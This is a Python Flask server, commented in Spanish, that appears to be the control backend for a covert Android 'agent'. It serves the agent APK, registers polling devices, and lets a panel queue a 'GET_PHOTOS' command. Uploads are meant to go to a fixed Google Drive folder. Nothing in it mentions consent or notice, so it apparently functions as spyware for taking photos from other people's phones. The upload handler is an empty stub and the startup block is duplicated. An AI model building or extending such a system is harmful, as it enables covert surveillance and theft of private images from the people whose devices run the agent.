import os
import json
import base64
import uuid
from flask import Flask, request, jsonify, send_from_directory, redirect
from datetime import datetime
from pydrive2.auth import GoogleAuth
from pydrive2.drive import GoogleDrive
from io import BytesIO
from google.oauth2.service_account import Credentials

# --- CONFIGURACIÓN ---
DRIVE_FOLDER_ID = '1Tux8uqv--gJjUc9_HrSZZEHsRyuzdJGO'
DEVICES_DB_FILE = 'devices.json'
PENDING_COMMAND_FILE = 'command.txt'
app = Flask(__name__)
drive = None

# --- Funciones de Datos ---
def load_data(filepath, default_data):
    if not os.path.exists(filepath): return default_data
    try:
        with open(filepath, 'r') as f: return json.load(f)
    except (IOError, json.JSONDecodeError): return default_data
def save_data(filepath, data):
    with open(filepath, 'w') as f: json.dump(data, f, indent=4)

# --- Autenticación ---
def authenticate_gdrive():
    secrets_json_str = os.environ.get('GOOGLE_CLIENT_SECRETS')
    if not secrets_json_str: raise Exception("Var de entorno GOOGLE_CLIENT_SECRETS no encontrada.")
    secrets_dict = json.loads(secrets_json_str)
    credentials = Credentials.from_service_account_info(secrets_dict, scopes=['https://www.googleapis.com/auth/drive'])
    gauth = GoogleAuth(); gauth.credentials = credentials
    return GoogleDrive(gauth)

# --- Endpoints ---

@app.route('/')
def serve_index(): return send_from_directory('.', 'index.html')

@app.route('/download/agent')
def download_agent_apk():
    try: return send_from_directory('public', 'app-debug.apk', as_attachment=True)
    except FileNotFoundError: return "APK no encontrado.", 404

# --- PARA EL AGENTE ANDROID ---
@app.route('/get-command')
def get_command_for_agent():
    device_id = request.args.get('deviceId')
    if not device_id: return jsonify({"command": "NONE"}), 400
    devices = load_data(DEVICES_DB_FILE, {})
    devices.setdefault(device_id, {'status': 'active'})['last_seen'] = str(datetime.now())
    save_data(DEVICES_DB_FILE, devices)
    if devices[device_id]['status'] == 'paused': return jsonify({"command": "NONE"})
    if os.path.exists(PENDING_COMMAND_FILE):
        with open(PENDING_COMMAND_FILE, 'r') as f: command = f.read().strip()
        os.remove(PENDING_COMMAND_FILE)
        return jsonify({"command": command})
    return jsonify({"command": "NONE"})

@app.route('/upload', methods=['POST'])
def upload_to_drive():
    # ... (la función de upload que ya teníamos)
    pass

# --- PARA EL PANEL DE CONTROL ---
@app.route('/get-devices', methods=['GET'])
def get_devices():
    return jsonify(load_data(DEVICES_DB_FILE, {}))

@app.route('/toggle-status', methods=['POST'])
def toggle_status():
    device_id = request.json.get('deviceId')
    devices = load_data(DEVICES_DB_FILE, {})
    if device_id in devices:
        devices[device_id]['status'] = 'paused' if devices[device_id]['status'] == 'active' else 'active'
        save_data(DEVICES_DB_FILE, devices)
        return jsonify({"status": "success"})
    return jsonify({"status": "error"}), 404

@app.route('/trigger-fetch', methods=['POST'])
def trigger_fetch_from_panel():
    with open(PENDING_COMMAND_FILE, 'w') as f: f.write("GET_PHOTOS")
    return jsonify({"status": "success"})

# --- INICIALIZACIÓN ---
with app.app_context():
    try:
        drive = authenticate_gdrive()
        print("Autenticación con Google Drive exitosa al arrancar.")
    except Exception as e:
        print(f"ERROR CRÍTICO AL ARRANCAR: {e}")
with app.app_context():
    try:
        drive = authenticate_gdrive()
        print("Autenticación con Google Drive exitosa al arrancar.")
    except Exception as e:
        print(f"ERROR CRÍTICO AL ARRANCAR: {e}")
